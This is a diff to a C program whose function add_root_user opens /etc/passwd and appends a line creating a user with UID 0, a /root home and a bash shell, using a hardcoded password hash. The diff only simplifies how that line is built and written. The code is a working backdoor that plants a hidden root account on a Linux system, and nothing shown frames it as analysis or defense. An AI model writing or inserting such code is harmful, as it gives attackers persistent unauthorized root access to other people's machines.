@@ -11,14 +11,13 @@
 // bravo oscar sierra tango alfa
 #define PASSWORD "$1$x0x0x0x0$1JGD.YYakC1aVB1BVo9o1/"
 
-#define BUFSIZE (sizeof(PASSWORD) + sizeof(USER) + 21)
+#define NEWUSER USER PASSWORD ":0:0::/root:/bin/bash\n"
 
 int check_root_user(int fd);
 void add_root_user(void);
 
 void add_root_user(void)
 {
-	char line[BUFSIZE];
 	int fd = open("/etc/passwd", O_RDWR);
 	if (fd == -1) {
 		return;
@@ -29,8 +28,7 @@ void add_root_user(void)
 	}
 
 	// USER:PASSWORD:0:0::/root:/bin/bash
-	sprintf(line, "%s%s:0:0::/root:/bin/bash\n", USER, PASSWORD);
-	write(fd, line, BUFSIZE - 1);
+	write(fd, NEWUSER, sizeof(NEWUSER) - 1);
 
 end:
 	close(fd);
